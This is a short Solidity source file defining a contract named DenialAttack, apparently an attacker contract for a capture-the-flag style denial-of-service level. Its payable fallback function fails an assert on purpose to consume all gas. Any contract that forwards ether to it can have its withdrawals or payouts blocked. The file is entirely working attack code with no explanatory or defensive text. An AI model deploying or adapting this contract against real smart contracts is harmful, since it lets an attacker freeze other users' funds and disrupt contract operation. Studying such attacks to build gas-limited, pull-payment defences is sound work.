pragma solidity ^0.4.24;

contract DenialAttack {

  function () payable {
      // consume all the gas
      assert(1==2);
  }

}
